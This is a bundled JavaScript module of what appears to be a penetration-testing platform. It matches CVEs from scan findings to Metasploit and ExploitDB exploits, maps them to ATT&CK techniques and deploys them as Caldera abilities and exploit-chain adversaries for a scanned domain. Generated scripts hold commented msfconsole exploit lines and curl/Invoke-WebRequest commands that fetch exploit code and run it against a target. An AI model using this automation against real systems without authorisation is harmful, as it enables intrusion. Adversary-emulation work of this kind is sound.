import {
  ingestMetasploitModules,
  init_ttp_ingest
} from "./chunk-J4IT4WYK.js";
import {
  fetchExploitDb,
  init_vuln_feeds
} from "./chunk-Z4F6I6ND.js";
import {
  ENV,
  init_env
} from "./chunk-NRYVRXXR.js";
import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/exploit-matcher.ts
function rankToLabel(rank) {
  if (rank >= 600) return "excellent";
  if (rank >= 500) return "great";
  if (rank >= 400) return "good";
  if (rank >= 300) return "normal";
  if (rank >= 200) return "average";
  if (rank >= 100) return "low";
  return "manual";
}
async function loadExploitDatabases() {
  if (cachedData && Date.now() - cachedData.timestamp < CACHE_TTL) {
    return cachedData;
  }
  console.log("[ExploitMatcher] Loading exploit databases...");
  const [msfData, edbData] = await Promise.allSettled([
    ingestMetasploitModules(),
    fetchExploitDb()
  ]);
  const metasploitExploits = msfData.status === "fulfilled" ? msfData.value.exploits : [];
  const exploitDbEntries = edbData.status === "fulfilled" ? edbData.value : [];
  console.log(`[ExploitMatcher] Loaded ${metasploitExploits.length} Metasploit modules, ${exploitDbEntries.length} ExploitDB entries`);
  cachedData = {
    metasploitExploits,
    exploitDbEntries,
    timestamp: Date.now()
  };
  return cachedData;
}
function buildMsfCveIndex(exploits) {
  const index = /* @__PURE__ */ new Map();
  for (const exp of exploits) {
    for (const cve of exp.cves) {
      const existing = index.get(cve) || [];
      existing.push(exp);
      index.set(cve, existing);
    }
  }
  return index;
}
function buildEdbCveIndex(entries) {
  const index = /* @__PURE__ */ new Map();
  for (const entry of entries) {
    for (const cve of entry.cveIds) {
      const existing = index.get(cve) || [];
      existing.push(entry);
      index.set(cve, existing);
    }
  }
  return index;
}
function isRemoteAccessVuln(title, description) {
  const text = `${title} ${description || ""}`.toLowerCase();
  return text.includes("remote code") || text.includes("rce") || text.includes("auth bypass") || text.includes("authentication bypass") || text.includes("ssrf") || text.includes("server-side request") || text.includes("unauthenticated") || text.includes("pre-auth") || text.includes("remote execution") || text.includes("command injection") || text.includes("sql injection") || text.includes("arbitrary code") || text.includes("remote access") || text.includes("unauthorized access") || text.includes("privilege escalation") || text.includes("directory traversal") || text.includes("path traversal") || text.includes("deserialization");
}
function mapCveToTechnique(title, msfFullname, edbType) {
  const text = `${title} ${msfFullname || ""} ${edbType || ""}`.toLowerCase();
  if (text.includes("rce") || text.includes("remote code") || text.includes("remote execution") || text.includes("arbitrary code")) {
    return { id: "T1190", name: "Exploit Public-Facing Application", tactic: "initial-access" };
  }
  if (text.includes("sql injection") || text.includes("sqli")) {
    return { id: "T1190", name: "Exploit Public-Facing Application", tactic: "initial-access" };
  }
  if (text.includes("command injection") || text.includes("os command")) {
    return { id: "T1059", name: "Command and Scripting Interpreter", tactic: "execution" };
  }
  if (text.includes("auth bypass") || text.includes("authentication bypass")) {
    return { id: "T1078", name: "Valid Accounts", tactic: "initial-access" };
  }
  if (text.includes("ssrf") || text.includes("server-side request")) {
    return { id: "T1190", name: "Exploit Public-Facing Application", tactic: "initial-access" };
  }
  if (text.includes("deserialization") || text.includes("deserializ")) {
    return { id: "T1203", name: "Exploitation for Client Execution", tactic: "execution" };
  }
  if (text.includes("privilege escalation") || text.includes("privesc") || edbType === "local") {
    return { id: "T1068", name: "Exploitation for Privilege Escalation", tactic: "privilege-escalation" };
  }
  if (text.includes("directory traversal") || text.includes("path traversal") || text.includes("lfi")) {
    return { id: "T1083", name: "File and Directory Discovery", tactic: "discovery" };
  }
  if (text.includes("denial of service") || text.includes("dos") || edbType === "dos") {
    return { id: "T1499", name: "Endpoint Denial of Service", tactic: "impact" };
  }
  if (text.includes("cross-site scripting") || text.includes("xss")) {
    return { id: "T1189", name: "Drive-by Compromise", tactic: "initial-access" };
  }
  if (edbType === "remote" || edbType === "webapps") {
    return { id: "T1190", name: "Exploit Public-Facing Application", tactic: "initial-access" };
  }
  return { id: "T1203", name: "Exploitation for Client Execution", tactic: "execution" };
}
function generateAbilityId(cveId, source) {
  const base = `${cveId}-${source}`.replace(/[^a-zA-Z0-9]/g, "");
  const hash = base.split("").reduce((acc, ch) => {
    return (acc << 5) - acc + ch.charCodeAt(0) | 0;
  }, 0);
  const hex = Math.abs(hash).toString(16).padStart(8, "0");
  return `${hex.slice(0, 8)}-${hex.slice(0, 4)}-4${hex.slice(1, 4)}-a${hex.slice(1, 4)}-${hex.padEnd(12, "0").slice(0, 12)}`;
}
function buildCalderaAbility(cveId, best, technique, findingTitle) {
  const abilityId = generateAbilityId(cveId, best.source);
  const executors = [];
  if (best.source === "metasploit") {
    const msfModule = best.command.replace("use ", "");
    if (best.platform.includes("windows") || best.platform === "" || best.platform.includes("multi")) {
      executors.push({
        name: "psh",
        platform: "windows",
        command: [
          `# Metasploit Module: ${msfModule}`,
          `# CVE: ${cveId}`,
          `# Auto-generated from ExploitMatcher`,
          `Write-Host "[*] Exploit module: ${msfModule}"`,
          `Write-Host "[*] Target CVE: ${cveId}"`,
          `Write-Host "[*] Use msfconsole to execute:"`,
          `Write-Host "    msfconsole -x '${best.command}; set RHOSTS #{host.ip}; set RPORT #{host.port}; run'"`,
          `# For automated execution, ensure msfconsole is in PATH:`,
          `# msfconsole -q -x "${best.command}; set RHOSTS #{host.ip}; set RPORT #{host.port}; set LHOST #{server.host}; exploit -j"`
        ].join("\n"),
        timeout: 300
      });
    }
    if (best.platform.includes("linux") || best.platform.includes("unix") || best.platform === "" || best.platform.includes("multi")) {
      executors.push({
        name: "sh",
        platform: "linux",
        command: [
          `#!/bin/bash`,
          `# Metasploit Module: ${msfModule}`,
          `# CVE: ${cveId}`,
          `# Auto-generated from ExploitMatcher`,
          `echo "[*] Exploit module: ${msfModule}"`,
          `echo "[*] Target CVE: ${cveId}"`,
          `echo "[*] Use msfconsole to execute:"`,
          `echo "    msfconsole -x '${best.command}; set RHOSTS #{host.ip}; set RPORT #{host.port}; run'"`,
          `# For automated execution:`,
          `# msfconsole -q -x "${best.command}; set RHOSTS #{host.ip}; set RPORT #{host.port}; set LHOST #{server.host}; exploit -j"`
        ].join("\n"),
        timeout: 300
      });
    }
  } else {
    executors.push({
      name: "sh",
      platform: "linux",
      command: [
        `#!/bin/bash`,
        `# ExploitDB: ${best.command}`,
        `# CVE: ${cveId}`,
        `# Auto-generated from ExploitMatcher`,
        `echo "[*] ExploitDB entry: ${best.name}"`,
        `echo "[*] Target CVE: ${cveId}"`,
        `echo "[*] Download exploit from: ${best.command}"`,
        `# Download and review exploit code:`,
        `# curl -sL "${best.command}" -o /tmp/exploit_${cveId.replace("CVE-", "")}.py`,
        `# python3 /tmp/exploit_${cveId.replace("CVE-", "")}.py #{host.ip} #{host.port}`
      ].join("\n"),
      timeout: 120
    });
    executors.push({
      name: "psh",
      platform: "windows",
      command: [
        `# ExploitDB: ${best.command}`,
        `# CVE: ${cveId}`,
        `# Auto-generated from ExploitMatcher`,
        `Write-Host "[*] ExploitDB entry: ${best.name}"`,
        `Write-Host "[*] Target CVE: ${cveId}"`,
        `Write-Host "[*] Download exploit from: ${best.command}"`,
        `# Invoke-WebRequest -Uri "${best.command}" -OutFile "$env:TEMP\\exploit_${cveId.replace("CVE-", "")}.py"`
      ].join("\n"),
      timeout: 120
    });
  }
  if (executors.length === 0) {
    executors.push({
      name: "sh",
      platform: "linux",
      command: `echo "[*] Manual exploit required for ${cveId} \u2014 ${best.name}"`,
      timeout: 30
    });
  }
  return {
    ability_id: abilityId,
    name: `[${cveId}] ${best.name.substring(0, 80)}`,
    description: `Auto-generated ability for ${cveId}: ${findingTitle}. Source: ${best.source === "metasploit" ? "Metasploit Framework" : "ExploitDB"}. ${best.description.substring(0, 200)}`,
    tactic: technique.tactic,
    technique_id: technique.id,
    technique_name: technique.name,
    executors,
    singleton: false,
    repeatable: true
  };
}
async function matchExploitsToFindings(findings) {
  const data = await loadExploitDatabases();
  const msfIndex = buildMsfCveIndex(data.metasploitExploits);
  const edbIndex = buildEdbCveIndex(data.exploitDbEntries);
  const matches = [];
  let totalMetasploit = 0;
  let totalExploitDb = 0;
  let totalCalderaAbilities = 0;
  let remoteAccessCount = 0;
  const confirmedFindings = findings.filter(
    (f) => f.corroborationTier === "confirmed" || f.corroborationTier === "probable"
  );
  for (const finding of confirmedFindings) {
    if (!finding.cveIds || finding.cveIds.length === 0) continue;
    const allMsfModules = [];
    const allEdbEntries = [];
    for (const cveId of finding.cveIds) {
      const msfMatches = msfIndex.get(cveId) || [];
      for (const msf of msfMatches) {
        allMsfModules.push({
          name: msf.name,
          fullname: msf.fullname,
          description: msf.description,
          platform: msf.platform,
          rank: msf.rank,
          rankLabel: rankToLabel(msf.rank),
          cves: msf.cves,
          msfCommand: `use ${msf.fullname}`
        });
      }
      const edbMatches = edbIndex.get(cveId) || [];
      for (const edb of edbMatches) {
        allEdbEntries.push({
          exploitId: edb.exploitId,
          description: edb.description,
          datePublished: edb.datePublished,
          author: edb.author,
          platform: edb.platform,
          type: edb.type,
          cveIds: edb.cveIds,
          exploitDbUrl: `https://www.exploit-db.com/exploits/${edb.exploitId}`
        });
      }
    }
    if (allMsfModules.length === 0 && allEdbEntries.length === 0) continue;
    totalMetasploit += allMsfModules.length;
    totalExploitDb += allEdbEntries.length;
    const isRemote = isRemoteAccessVuln(finding.title, finding.description);
    if (isRemote) remoteAccessCount++;
    let bestExploit = null;
    if (allMsfModules.length > 0) {
      const sorted = [...allMsfModules].sort((a, b) => b.rank - a.rank);
      const best = sorted[0];
      bestExploit = {
        source: "metasploit",
        name: best.name,
        description: best.description,
        platform: best.platform,
        reliability: rankToLabel(best.rank),
        command: best.msfCommand,
        isRemote: best.fullname.includes("remote") || best.fullname.includes("http") || best.fullname.includes("webapp")
      };
    } else if (allEdbEntries.length > 0) {
      const sorted = [...allEdbEntries].sort((a, b) => {
        const typeOrder = { remote: 4, webapps: 3, local: 2, dos: 1 };
        return (typeOrder[b.type] || 0) - (typeOrder[a.type] || 0);
      });
      const best = sorted[0];
      bestExploit = {
        source: "exploitdb",
        name: best.description,
        description: best.description,
        platform: best.platform,
        reliability: "normal",
        command: best.exploitDbUrl,
        isRemote: best.type === "remote" || best.type === "webapps"
      };
    }
    let calderaAbility = null;
    if (bestExploit) {
      const technique = mapCveToTechnique(finding.title, bestExploit.command, allEdbEntries[0]?.type);
      calderaAbility = buildCalderaAbility(
        finding.cveIds[0],
        bestExploit,
        technique,
        finding.title
      );
      totalCalderaAbilities++;
    }
    matches.push({
      cveId: finding.cveIds[0],
      findingTitle: finding.title,
      corroborationTier: finding.corroborationTier,
      severity: finding.severity,
      metasploitModules: allMsfModules,
      exploitDbEntries: allEdbEntries,
      totalExploits: allMsfModules.length + allEdbEntries.length,
      bestExploit,
      isRemoteAccess: isRemote,
      calderaAbility
    });
  }
  matches.sort((a, b) => {
    if (a.isRemoteAccess !== b.isRemoteAccess) return a.isRemoteAccess ? -1 : 1;
    if (a.severity !== b.severity) return b.severity - a.severity;
    return b.totalExploits - a.totalExploits;
  });
  console.log(`[ExploitMatcher] Matched ${matches.length} findings \u2192 ${totalMetasploit} MSF modules, ${totalExploitDb} EDB entries, ${totalCalderaAbilities} emulation abilities`);
  return {
    matches,
    totalMetasploit,
    totalExploitDb,
    totalCalderaAbilities,
    remoteAccessCount
  };
}
async function deployExploitsToCaldera(exploitMatches) {
  const calderaBaseUrl = ENV.calderaBaseUrl;
  const calderaApiKey = ENV.calderaApiKey;
  if (!calderaBaseUrl || !calderaApiKey) {
    console.warn("[ExploitMatcher] Cyber C2 not configured \u2014 skipping deployment");
    return { deployed: [], failed: [], skipped: exploitMatches.map((m) => m.cveId) };
  }
  const deployed = [];
  const failed = [];
  const skipped = [];
  let existingAbilityIds = /* @__PURE__ */ new Set();
  try {
    const resp = await fetch(`${calderaBaseUrl}/api/v2/abilities`, {
      headers: { KEY: calderaApiKey },
      signal: AbortSignal.timeout(15e3)
    });
    if (resp.ok) {
      const abilities = await resp.json();
      existingAbilityIds = new Set(abilities.map((a) => a.ability_id));
    }
  } catch {
    console.warn("[ExploitMatcher] Could not fetch existing abilities \u2014 will attempt creation anyway");
  }
  for (const match of exploitMatches) {
    if (!match.calderaAbility) {
      skipped.push(match.cveId);
      continue;
    }
    if (existingAbilityIds.has(match.calderaAbility.ability_id)) {
      console.log(`[ExploitMatcher] Ability ${match.calderaAbility.ability_id} already exists for ${match.cveId} \u2014 skipping`);
      deployed.push(match.cveId);
      continue;
    }
    try {
      const resp = await fetch(`${calderaBaseUrl}/api/v2/abilities`, {
        method: "POST",
        headers: {
          KEY: calderaApiKey,
          "Content-Type": "application/json"
        },
        body: JSON.stringify(match.calderaAbility),
        signal: AbortSignal.timeout(1e4)
      });
      if (resp.ok) {
        deployed.push(match.cveId);
        console.log(`[ExploitMatcher] Deployed ability for ${match.cveId}: ${match.calderaAbility.name}`);
      } else {
        const errText = await resp.text().catch(() => "unknown");
        failed.push({ cveId: match.cveId, error: `HTTP ${resp.status}: ${errText}` });
      }
    } catch (err) {
      failed.push({ cveId: match.cveId, error: err.message });
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  console.log(`[ExploitMatcher] Deployment complete: ${deployed.length} deployed, ${failed.length} failed, ${skipped.length} skipped`);
  return { deployed, failed, skipped };
}
async function createExploitAdversary(scanDomain, exploitMatches) {
  const calderaBaseUrl = ENV.calderaBaseUrl;
  const calderaApiKey = ENV.calderaApiKey;
  if (!calderaBaseUrl || !calderaApiKey) {
    return { success: false, error: "Cyber C2 not configured" };
  }
  const abilitiesWithPayloads = exploitMatches.filter((m) => m.calderaAbility);
  if (abilitiesWithPayloads.length === 0) {
    return { success: false, error: "No exploit abilities to deploy" };
  }
  const adversaryId = `exploit-${scanDomain.replace(/[^a-z0-9]/gi, "-").toLowerCase()}-${Date.now().toString(36)}`;
  const adversaryName = `Exploit Chain: ${scanDomain} (${abilitiesWithPayloads.length} CVEs)`;
  try {
    const deployResult = await deployExploitsToCaldera(exploitMatches);
    const abilityIds = abilitiesWithPayloads.filter((m) => m.calderaAbility).map((m) => m.calderaAbility.ability_id);
    const resp = await fetch(`${calderaBaseUrl}/api/v2/adversaries`, {
      method: "POST",
      headers: {
        KEY: calderaApiKey,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        adversary_id: adversaryId,
        name: adversaryName,
        description: `Auto-generated exploit chain for ${scanDomain}. Contains ${abilitiesWithPayloads.length} CVE-matched exploits from Metasploit and ExploitDB. Remote access vulns: ${exploitMatches.filter((m) => m.isRemoteAccess).length}.`,
        atomic_ordering: abilityIds,
        tags: ["auto-generated", "exploit-chain", scanDomain]
      }),
      signal: AbortSignal.timeout(1e4)
    });
    if (!resp.ok) {
      const errText = await resp.text().catch(() => "unknown");
      return { success: false, error: `Failed to create adversary: HTTP ${resp.status}: ${errText}` };
    }
    console.log(`[ExploitMatcher] Created adversary "${adversaryName}" with ${abilityIds.length} abilities`);
    return {
      success: true,
      adversaryId,
      adversaryName,
      abilityCount: abilityIds.length
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}
var cachedData, CACHE_TTL;
var init_exploit_matcher = __esm({
  "server/lib/exploit-matcher.ts"() {
    init_env();
    init_ttp_ingest();
    init_vuln_feeds();
    cachedData = null;
    CACHE_TTL = 4 * 60 * 60 * 1e3;
  }
});

export {
  rankToLabel,
  loadExploitDatabases,
  buildMsfCveIndex,
  buildEdbCveIndex,
  isRemoteAccessVuln,
  mapCveToTechnique,
  generateAbilityId,
  buildCalderaAbility,
  matchExploitsToFindings,
  deployExploitsToCaldera,
  createExploitAdversary,
  init_exploit_matcher
};
